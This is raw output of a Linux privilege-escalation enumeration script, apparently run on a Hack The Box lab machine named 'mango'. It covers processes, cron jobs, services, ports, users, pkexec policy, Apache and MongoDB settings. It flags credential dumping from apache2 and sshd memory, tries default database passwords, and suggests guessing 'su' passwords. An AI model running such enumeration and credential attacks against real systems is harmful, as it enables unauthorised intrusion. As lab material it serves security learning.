root        433  0.0  0.0  97708  1816 ?        Ss   Dec08   0:00 /sbin/lvmetad -f
root        448  0.0  0.2  46336  5172 ?        Ss   Dec08   0:00 /lib/systemd/systemd-udevd
root        912  0.0  0.2  70584  5972 ?        Ss   Dec08   0:00 /lib/systemd/systemd-logind
root        915  0.0  1.2 634076 24324 ?        Ssl  Dec08   0:01 /usr/lib/snapd/snapd
root        916  0.0  0.1  30028  3288 ?        Ss   Dec08   0:00 /usr/sbin/cron -f
root        960  0.0  0.8 169096 17268 ?        Ssl  Dec08   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root        989  0.0  0.4  88224  9800 ?        Ss   Dec08   0:00 /usr/bin/VGAuthService
root        996  0.0  0.3 286252  6872 ?        Ssl  Dec08   0:00 /usr/lib/accountsservice/accounts-daemon[0m
syslog      914  0.0  0.2 267272  5176 ?        Ssl  Dec08   0:00 /usr/sbin/rsyslogd -n
systemd+    560  0.0  0.1 141928  3180 ?        Ssl  Dec08   0:01 /lib/systemd/systemd-timesyncd
systemd+    699  0.0  0.2  71848  5344 ?        Ss   Dec08   0:00 /lib/systemd/systemd-networkd
systemd+    746  0.0  0.2  70628  5352 ?        Ss   Dec08   0:00 /lib/systemd/systemd-resolved
www-data   3537  0.5  0.5 395756 11212 ?        S    02:34   0:00 /usr/sbin/apache2 -k start
www-data   3547  0.5  0.5 395756 11212 ?        S    02:35   0:00 /usr/sbin/apache2 -k start
www-data   3550  0.5  0.5 395756 11212 ?        S    02:35   0:00 /usr/sbin/apache2 -k start
www-data   3558  0.4  0.5 395756 11212 ?        S    02:35   0:00 /usr/sbin/apache2 -k start
www-data   3559  0.5  0.5 395756 11212 ?        S    02:35   0:00 /usr/sbin/apache2 -k start
www-data   3562  0.5  0.5 395756 11212 ?        S    02:35   0:00 /usr/sbin/apache2 -k start
www-data   3566  0.5  0.5 395756 11212 ?        S    02:35   0:00 /usr/sbin/apache2 -k start
www-data   3567  0.4  0.5 395756 11212 ?        S    02:35   0:00 /usr/sbin/apache2 -k start
www-data   3573  0.4  0.5 395756 11212 ?        S    02:36   0:00 /usr/sbin/apache2 -k start
www-data   3577  0.4  0.5 395756 11212 ?        S    02:36   0:00 /usr/sbin/apache2 -k start
www-data   3578  0.4  0.5 395756 11212 ?        S    02:36   0:00 /usr/sbin/apache2 -k start
www-data   3579  0.4  0.5 395756 11212 ?        S    02:36   0:00 /usr/sbin/apache2 -k start
www-data   3580  0.4  0.5 395756 11212 ?        S    02:36   0:00 /usr/sbin/apache2 -k start
www-data   3582  0.4  0.5 395756 11212 ?        S    02:36   0:00 /usr/sbin/apache2 -k start
www-data   3583  0.4  0.5 395756 11212 ?        S    02:36   0:00 /usr/sbin/apache2 -k start
www-data   3584  0.4  0.5 395756 11212 ?        S    02:36   0:00 /usr/sbin/apache2 -k start
www-data   3586  0.4  0.5 395756 11212 ?        S    02:36   0:00 /usr/sbin/apache2 -k start
www-data   3587  0.4  0.5 395756 11212 ?        S    02:36   0:00 /usr/sbin/apache2 -k start
www-data   3588  0.3  0.5 395756 11212 ?        S    02:37   0:00 /usr/sbin/apache2 -k start
www-data   3592  0.3  0.5 395756 11212 ?        S    02:37   0:00 /usr/sbin/apache2 -k start
www-data   3593  0.3  0.5 395756 11212 ?        S    02:37   0:00 /usr/sbin/apache2 -k start
www-data   3595  0.3  0.5 395756 11212 ?        S    02:37   0:00 /usr/sbin/apache2 -k start
www-data   3596  0.2  0.5 395756 11212 ?        S    02:37   0:00 /usr/sbin/apache2 -k start
www-data   3992  0.1  0.5 395756 11216 ?        S    02:37   0:00 /usr/sbin/apache2 -k start
www-data   4041  0.0  0.5 395756 11216 ?        S    02:37   0:00 /usr/sbin/apache2 -k start
www-data   4042  0.0  0.5 395756 11216 ?        S    02:37   0:00 /usr/sbin/apache2 -k start
www-data   4043  0.0  0.5 395756 11216 ?        S    02:37   0:00 /usr/sbin/apache2 -k start

[+] Binary processes permissions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
1.1M -rwxr-xr-x 1 root root 1.1M Apr  4  2018 /bin/bash
   0 lrwxrwxrwx 1 root root    4 Feb 14  2019 /bin/sh -> dash
1.6M -rwxr-xr-x 1 root root 1.6M Sep  5  2019 /lib/systemd/systemd
128K -rwxr-xr-x 1 root root 127K Sep  5  2019 /lib/systemd/systemd-journald
216K -rwxr-xr-x 1 root root 215K Sep  5  2019 /lib/systemd/systemd-logind
1.6M -rwxr-xr-x 1 root root 1.6M Sep  5  2019 /lib/systemd/systemd-networkd
372K -rwxr-xr-x 1 root root 371K Sep  5  2019 /lib/systemd/systemd-resolved
 40K -rwxr-xr-x 1 root root  39K Sep  5  2019 /lib/systemd/systemd-timesyncd
572K -rwxr-xr-x 1 root root 571K Sep  5  2019 /lib/systemd/systemd-udevd
 56K -rwxr-xr-x 1 root root  56K Oct 15  2018 /sbin/agetty
   0 lrwxrwxrwx 1 root root   20 Sep  5  2019 /sbin/init -> /lib/systemd/systemd
 84K -rwxr-xr-x 1 root root  83K Apr 12  2018 /sbin/lvmetad
232K -rwxr-xr-x 1 root root 232K Jun 10  2019 /usr/bin/dbus-daemon[0m
 20K -rwxr-xr-x 1 root root  19K Nov 23  2018 /usr/bin/lxcfs
 60M -rwxr-xr-x 1 root root  60M Dec 19  2013 /usr/bin/mongod
   0 lrwxrwxrwx 1 root root    9 Oct 25  2018 /usr/bin/python3 -> python3.6
124K -rwxr-xr-x 1 root root 123K Oct 10  2018 /usr/bin/VGAuthService
 48K -rwxr-xr-x 1 root root  47K Oct 10  2018 /usr/bin/vmtoolsd
180K -rwxr-xr-x 1 root root 179K Dec 18  2017 /usr/lib/accountsservice/accounts-daemon[0m
 16K -rwxr-xr-x 1 root root  15K Mar 27  2019 /usr/lib/policykit-1/polkitd
 17M -rwxr-xr-x 1 root root  17M Mar 15  2019 /usr/lib/snapd/snapd
656K -rwxr-xr-x 1 root root 656K Sep 16  2019 /usr/sbin/apache2
 28K -rwxr-xr-x 1 root root  27K Feb 20  2018 /usr/sbin/atd
 48K -rwxr-xr-x 1 root root  47K Nov 16  2017 /usr/sbin/cron
668K -rwxr-xr-x 1 root root 665K Apr 24  2018 /usr/sbin/rsyslogd
772K -rwxr-xr-x 1 root root 769K Mar  4  2019 /usr/sbin/sshd

[+] Processes with credentials in memory (root req)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd Not Found
apache2 process found (dump creds from memory as root)
sshd: process found (dump creds from memory as root)

[+] Cron jobs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs
-rw-r--r-- 1 root root  722 Nov 16  2017 /etc/crontab

/etc/cron.d:
total 24
drwxr-xr-x  2 root root 4096 Sep 27  2019 .
drwxr-xr-x 95 root root 4096 Oct 10  2019 ..
-rw-r--r--  1 root root  589 Jun 26  2018 mdadm
-rw-r--r--  1 root root  712 Jan 17  2018 php
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rw-r--r--  1 root root  191 Feb 14  2019 popularity-contest

/etc/cron.daily:
total 64
drwxr-xr-x  2 root root 4096 Sep 28  2019 .
drwxr-xr-x 95 root root 4096 Oct 10  2019 ..
-rwxr-xr-x  1 root root  539 Jul 16  2019 apache2
-rwxr-xr-x  1 root root  376 Nov 20  2017 apport
-rwxr-xr-x  1 root root 1478 Apr 20  2018 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1176 Nov  2  2017 dpkg
-rwxr-xr-x  1 root root  372 Aug 21  2017 logrotate
-rwxr-xr-x  1 root root 1065 Apr  7  2018 man-db
-rwxr-xr-x  1 root root  539 Jun 26  2018 mdadm
-rwxr-xr-x  1 root root  538 Mar  1  2018 mlocate
-rwxr-xr-x  1 root root  249 Jan 25  2018 passwd
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root 3477 Feb 21  2018 popularity-contest
-rwxr-xr-x  1 root root  246 Mar 21  2018 ubuntu-advantage-tools
-rwxr-xr-x  1 root root  214 Jun 27  2018 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Feb 14  2019 .
drwxr-xr-x 95 root root 4096 Oct 10  2019 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Feb 14  2019 .
drwxr-xr-x 95 root root 4096 Oct 10  2019 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Feb 14  2019 .
drwxr-xr-x 95 root root 4096 Oct 10  2019 ..
-rwxr-xr-x  1 root root  723 Apr  7  2018 man-db
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root  211 Jun 27  2018 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin


[+] Services
[i] Search for outdated versions
 [ - ]  acpid
 [ + ]  apache-htcacheclean
 [ + ]  apache2
 [ + ]  apparmor
 [ + ]  apport
 [ + ]  atd
 [ - ]  console-setup.sh
 [ + ]  cron
 [ - ]  cryptdisks
 [ - ]  cryptdisks-early
 [ + ]  dbus
 [ + ]  ebtables
 [ + ]  grub-common
 [ - ]  hwclock.sh
 [ - ]  irqbalance
 [ + ]  iscsid
 [ - ]  keyboard-setup.sh
 [ + ]  kmod
 [ - ]  lvm2
 [ + ]  lvm2-lvmetad
 [ + ]  lvm2-lvmpolld
 [ + ]  lxcfs
 [ - ]  lxd
 [ - ]  mdadm
 [ - ]  mdadm-waitidle
 [ + ]  networking
 [ - ]  open-iscsi
 [ + ]  open-vm-tools
 [ - ]  plymouth
 [ - ]  plymouth-log
 [ + ]  procps
 [ - ]  rsync
 [ + ]  rsyslog
 [ - ]  screen-cleanup
 [ + ]  ssh
 [ + ]  udev
 [ + ]  ufw
 [ + ]  unattended-upgrades
 [ - ]  uuidd
 [ - ]  x11-common

[+] Systemd PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

[+] Analyzing .service files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services
/etc/systemd/system/multi-user.target.wants/networking.service is executing some relative path
/etc/systemd/system/network-online.target.wants/networking.service is executing some relative path
/lib/systemd/system/networking.service is executing some relative path
/snap/core/6350/etc/systemd/system/multi-user.target.wants/networking.service is executing some relative path
/snap/core/6350/etc/systemd/system/network-online.target.wants/networking.service is executing some relative path
/snap/core/6350/lib/systemd/system/emergency.service is executing some relative path
/snap/core/6350/lib/systemd/system/networking.service is executing some relative path
/snap/core/6350/lib/systemd/system/rescue.service is executing some relative path
/snap/core/7713/etc/systemd/system/multi-user.target.wants/networking.service is executing some relative path
/snap/core/7713/etc/systemd/system/network-online.target.wants/networking.service is executing some relative path
/snap/core/7713/lib/systemd/system/emergency.service is executing some relative path
/snap/core/7713/lib/systemd/system/networking.service is executing some relative path
/snap/core/7713/lib/systemd/system/rescue.service is executing some relative path
You can't write on systemd PATH

[+] System timers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
NEXT                         LEFT          LAST                         PASSED       UNIT                         ACTIVATES
Wed 2020-12-09 02:39:00 UTC  1min 14s left Wed 2020-12-09 02:09:13 UTC  28min ago    phpsessionclean.timer        phpsessionclean.service
Wed 2020-12-09 06:32:11 UTC  3h 54min left Tue 2020-12-08 22:38:10 UTC  3h 59min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Wed 2020-12-09 07:58:40 UTC  5h 20min left Tue 2020-12-08 22:38:10 UTC  3h 59min ago apt-daily.timer              apt-daily.service
Wed 2020-12-09 12:07:07 UTC  9h left       Tue 2020-12-08 23:35:26 UTC  3h 2min ago  motd-news.timer              motd-news.service
Wed 2020-12-09 22:53:05 UTC  20h left      Tue 2020-12-08 22:53:05 UTC  3h 44min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Mon 2020-12-14 00:00:00 UTC  4 days left   Tue 2020-12-08 22:38:10 UTC  3h 59min ago fstrim.timer                 fstrim.service
n/a                          n/a           n/a                          n/a          snapd.snap-repair.timer      snapd.snap-repair.service
n/a                          n/a           n/a                          n/a          ureadahead-stop.timer        ureadahead-stop.service

[+] Analyzing .timer files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers

[+] Analyzing .socket files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets

[+] HTTP sockets
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
Socket /run/snapd.socket owned by root uses HTTP. Response to /index:
{"type":"sync","status-code":200,"status":"OK","result":["TBD"]}
Socket /run/snapd-snap.socket owned by root uses HTTP. Response to /index:
{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}

[+] D-Bus config files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf (        <policy group="power">)

[+] D-Bus Service Objects list
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION        
:1.0                                 699 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -                  
:1.1                                 746 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service  -          -                  
:1.141                             20675 busctl          admin            :1.141        session-13.scope          13         -                  
:1.2                                 912 systemd-logind  root             :1.2          systemd-logind.service    -          -                  
:1.3                                   1 systemd         root             :1.3          init.scope                -          -                  
:1.4                                 996 accounts-daemon root             :1.4          accounts-daemon.service   -          -                  
:1.6                                1060 polkitd         root             :1.6          polkit.service            -          -                  
:1.7                                 960 networkd-dispat root             :1.7          networkd-dispatcher.seâ€¦ce -          -                  
:1.8                                1015 unattended-upgr root             :1.8          unattended-upgrades.seâ€¦ce -          -                  
com.ubuntu.LanguageSelector            - -               -                (activatable) -                         -         
com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -         
org.freedesktop.Accounts             996 accounts-daemon root             :1.4          accounts-daemon.service   -          -                  
org.freedesktop.DBus                   1 systemd         root             -             init.scope                -          -                  
org.freedesktop.PolicyKit1          1060 polkitd         root             :1.6          polkit.service            -          -                  
org.freedesktop.hostname1              - -               -                (activatable) -                         -         
org.freedesktop.locale1                - -               -                (activatable) -                         -         
org.freedesktop.login1               912 systemd-logind  root             :1.2          systemd-logind.service    -          -                  
org.freedesktop.network1             699 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -                  
org.freedesktop.resolve1             746 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service  -          -                  
org.freedesktop.systemd1               1 systemd         root             :1.3          init.scope                -          -                  
org.freedesktop.thermald               - -               -                (activatable) -                         -         
org.freedesktop.timedate1              - -               -                (activatable) -                         -         


===================================( Network Information )====================================
[+] Hostname, hosts and DNS
mango
127.0.0.1	localhost.localdomain	localhost
::1		localhost6.localdomain6	localhost6

::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
ff02::3 ip6-allhosts

nameserver 127.0.0.53
options edns0

[+] Content of /etc/inetd.conf & /etc/xinetd.conf
/etc/inetd.conf Not Found

[+] Interfaces
# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0
ens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.162  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 fe80::250:56ff:feb9:fc11  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb9:fc11  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b9:fc:11  txqueuelen 1000  (Ethernet)
        RX packets 10368087  bytes 882611854 (882.6 MB)
        RX errors 0  dropped 32  overruns 0  frame 0
        TX packets 6956260  bytes 1257404992 (1.2 GB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 51671  bytes 4286195 (4.2 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 51671  bytes 4286195 (4.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


[+] Networks and neighbours
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         _gateway        0.0.0.0         UG    0      0        0 ens33
10.10.10.0      0.0.0.0         255.255.255.0   U     0      0        0 ens33
Address                  HWtype  HWaddress           Flags Mask            Iface
_gateway                 ether   00:50:56:b9:1a:f3   C                     ens33

[+] Iptables rules
iptables rules Not Found

[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0   6508 10.10.10.162:22         10.10.14.8:49234        ESTABLISHED -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::443                  :::*                    LISTEN      -                   
tcp6       0    435 10.10.10.162:80         10.10.14.8:46230        ESTABLISHED -                   
tcp6       0    435 10.10.10.162:80         10.10.14.8:46208        ESTABLISHED -                   
tcp6       0    435 10.10.10.162:80         10.10.14.8:46212        ESTABLISHED -                   
tcp6       0      1 10.10.10.162:80         10.10.14.8:46188        LAST_ACK    -                   
tcp6       0      1 10.10.10.162:80         10.10.14.8:46182        LAST_ACK    -                   
tcp6       0      0 10.10.10.162:80         10.10.14.8:46252        SYN_RECV    -                   
tcp6       0    435 10.10.10.162:80         10.10.14.8:46228        ESTABLISHED -                   
tcp6       0    435 10.10.10.162:80         10.10.14.8:46218        ESTABLISHED -                   
tcp6       0    435 10.10.10.162:80         10.10.14.8:46214        ESTABLISHED -                   
tcp6       0    435 10.10.10.162:80         10.10.14.8:46206        ESTABLISHED -                   
tcp6       0      0 10.10.10.162:80         10.10.14.8:46254        SYN_RECV    -                   
tcp6       0    435 10.10.10.162:80         10.10.14.8:46216        ESTABLISHED -                   
tcp6       0    435 10.10.10.162:80         10.10.14.8:46192        ESTABLISHED -                   
tcp6       0      1 10.10.10.162:80         10.10.14.8:46180        LAST_ACK    -                   
tcp6       0      1 10.10.10.162:80         10.10.14.8:46184        LAST_ACK    -                   
tcp6       0      0 10.10.10.162:80         10.10.14.8:46246        SYN_RECV    -                   
tcp6       0      0 10.10.10.162:80         10.10.14.8:46260        SYN_RECV    -                   
tcp6       0    435 10.10.10.162:80         10.10.14.8:46200        ESTABLISHED -                   
tcp6       0      0 10.10.10.162:80         10.10.14.8:46250        SYN_RECV    -                   
tcp6       0      1 10.10.10.162:80         10.10.14.8:43464        LAST_ACK    -                   
tcp6       0      0 10.10.10.162:80         10.10.14.8:46238        SYN_RECV    -                   
tcp6       0    435 10.10.10.162:80         10.10.14.8:46226        ESTABLISHED -                   
tcp6       0      0 10.10.10.162:80         10.10.14.8:46258        SYN_RECV    -                   
tcp6       0    435 10.10.10.162:80         10.10.14.8:46222        ESTABLISHED -                   
tcp6       0      0 10.10.10.162:80         10.10.14.8:46236        SYN_RECV    -                   
tcp6       0      0 10.10.10.162:80         10.10.14.8:46240        SYN_RECV    -                   
tcp6       0    435 10.10.10.162:80         10.10.14.8:46210        ESTABLISHED -                   
tcp6       0    435 10.10.10.162:80         10.10.14.8:46204        ESTABLISHED -                   
tcp6       0    435 10.10.10.162:80         10.10.14.8:46198        ESTABLISHED -                   
tcp6       0    435 10.10.10.162:80         10.10.14.8:46194        ESTABLISHED -                   
tcp6       0      1 10.10.10.162:80         10.10.14.8:46186        LAST_ACK    -                   
tcp6       0      1 10.10.10.162:80         10.10.14.8:43462        LAST_ACK    -                   
tcp6       0    435 10.10.10.162:80         10.10.14.8:46196        ESTABLISHED -                   
tcp6       0    435 10.10.10.162:80         10.10.14.8:46220        ESTABLISHED -                   
tcp6       0    435 10.10.10.162:80         10.10.14.8:46224        ESTABLISHED -                   
tcp6       0      1 10.10.10.162:80         10.10.14.8:43468        LAST_ACK    -                   
tcp6       0      0 10.10.10.162:80         10.10.14.8:46244        SYN_RECV    -                   
tcp6       0      0 10.10.10.162:80         10.10.14.8:46248        SYN_RECV    -                   
tcp6       0    435 10.10.10.162:80         10.10.14.8:46234        ESTABLISHED -                   
tcp6       0      1 10.10.10.162:80         10.10.14.8:46174        LAST_ACK    -                   
tcp6       0      0 10.10.10.162:80         10.10.14.8:46256        SYN_RECV    -                   
tcp6       0    435 10.10.10.162:80         10.10.14.8:46232        ESTABLISHED -                   
tcp6       0      0 10.10.10.162:80         10.10.14.8:46262        SYN_RECV    -                   
tcp6       0    435 10.10.10.162:80         10.10.14.8:46242        ESTABLISHED -                   
tcp6       0    435 10.10.10.162:80         10.10.14.8:46202        ESTABLISHED -                   
tcp6       0      1 10.10.10.162:80         10.10.14.8:46190        LAST_ACK    -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   

[+] Can I sniff with tcpdump?
No

[+] Internet Access?
icmp is not available
Port 443 is not accessible
Port 80 is not accessible


====================================( Users Information )=====================================
[+] My user
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#users
uid=4000000000(admin) gid=1001(admin) groups=1001(admin)

[+] Do I have PGP keys?

[+] Clipboard or highlighted text?
xsel and xclip Not Found

[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid

[+] Checking sudo tokens
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
/proc/sys/kernel/yama/ptrace_scope is not enabled (1)
gdb wasn't found in PATH

[+] Checking /etc/doas.conf
/etc/doas.conf Not Found

[+] Checking Pkexec policy
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2

[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

[+] Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!

[+] Superusers
root:x:0:0:root:/root:/bin/bash

[+] Users with console
admin:x:4000000000:1001:,,,:/home/admin/:/bin/sh
mango:x:1000:1000:mango:/home/mango:/bin/bash
root:x:0:0:root:/root:/bin/bash

[+] All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1000(mango) gid=1000(mango) groups=1000(mango)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=106(uuidd) gid=110(uuidd) groups=110(uuidd)
uid=107(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=108(landscape) gid=112(landscape) groups=112(landscape)
uid=109(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=111(mongodb) gid=65534(nogroup) groups=65534(nogroup),114(mongodb)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4000000000(admin) gid=1001(admin) groups=1001(admin)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

[+] Login now
 02:40:05 up  4:02,  1 user,  load average: 0.29, 0.45, 0.36
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
mango    pts/0    10.10.14.8       02:28    2:53   0.09s  0.01s sshd: mango [priv]  

[+] Last logons
root     pts/2        172.16.118.230   Fri Sep 27 16:32 - down   (00:00)
root     pts/2        172.16.118.230   Fri Sep 27 16:00 - 16:31  (00:30)
root     pts/0        172.16.118.227   Fri Sep 27 14:37 - down   (01:54)
root     pts/0        172.16.118.227   Fri Sep 27 14:11 - 14:12  (00:00)
root     pts/1        172.16.118.227   Fri Sep 27 13:56 - down   (02:35)
mango    pts/0        172.16.118.227   Fri Sep 27 13:55 - 13:57  (00:02)
mango    tty1                          Fri Sep 27 13:54 - down   (02:37)
reboot   system boot  4.15.0-64-generi Fri Sep 27 13:53 - 16:32  (02:38)

wtmp begins Fri Sep 27 13:53:48 2019

[+] Last time logon each user
Username         Port     From             Latest
root             tty1                      Thu Oct 10 08:33:27 +0000 2019
mango            pts/0    10.10.14.8       Wed Dec  9 02:28:52 +0000 2020

[+] Password policy
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512


===================================( Software Information )===================================
[+] MySQL version
mysql Not Found

[+] MySQL connection using default root/root ........... No
[+] MySQL connection using root/toor ................... No
[+] MySQL connection using root/NOPASS ................. No
[+] Searching mysql credentials and exec

[+] PostgreSQL version and pgadmin credentials
 Not Found

[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No
[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No

[+] Apache server info
Version: Server version: Apache/2.4.29 (Ubuntu)
Server built:   2019-09-16T12:58:48
/etc/apache2/sites-enabled/000-default.conf:	ServerName staging-order.mango.htb
PHP exec extensions
/etc/apache2/mods-enabled/php7.2.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-enabled/php7.2.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php7.2.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php7.2.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-available/php7.2.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-available/php7.2.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php7.2.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.2.conf:    SetHandler application/x-httpd-php-source

[+] Searching PHPCookies
 Not Found

[+] Searching Wordpress wp-config.php files
wp-config.php Not Found

[+] Searching Drupal settings.php files
/default/settings.php Not Found

[+] Searching Tomcat users file
tomcat-users.xml Not Found

[+] Mongo information
MongoDB shell version v4.0.12
git version: 5776e3cbf9e7afe86e6b29e22520ffb6766e95d4
OpenSSL version: OpenSSL 1.1.1  11 Sep 2018
allocator: tcmalloc
modules: none
build environment:
    distmod: ubuntu1804
    distarch: x86_64
    target_arch: x86_64
Found /etc/mongod.conf
storage:
  dbPath: /var/lib/mongodb
  journal:
    enabled: true
systemLog:
  destination: file
  logAppend: true
  path: /var/log/mongodb/mongod.log
net:
  port: 27017
  bindIp: 127.0.0.1
processManagement:
  timeZoneInfo: /usr/share/zoneinfo

[+] Searching supervisord configuration file
supervisord.conf Not Found

[+] Searching cesi configuration file
cesi.conf Not Found

[+] Searching Rsyncd config file
/usr/share/doc/rsync/examples/rsyncd.conf
[ftp]
	comment = public archive
	path = /var/www/pub
	use chroot = yes
	lock file = /var/lock/rsyncd
	read only = yes
	list = yes
	uid = nobody
	gid = nogroup
	strict modes = yes
	ignore errors = no
	ignore nonreadable = yes
	transfer logging = no
	timeout = 600
	refuse options = checksum dry-run
	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz

[+] Searching Hostapd config file
hostapd.conf Not Found

[+] Searching wifi conns file
 Not Found

[+] Searching Anaconda-ks config files
anaconda-ks.cfg Not Found

[+] Searching .vnc directories and their passwd files
.vnc Not Found

[+] Searching ldap directories and their hashes
/etc/ldap
The password hash is from the {SSHA} to 'structural'

[+] Searching .ovpn files and credentials
.ovpn Not Found

[+] Searching ssl/ssh files
PermitRootLogin yes
ChallengeResponseAuthentication no
UsePAM yes
PasswordAuthentication yes
  --> Some certificates were found (out limited):
/etc/pollinate/entropy.ubuntu.com.pem

 --> /etc/hosts.allow file found, read the rules:
/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

[+] Searching unexpected auth lines in /etc/pam.d/sshd
No

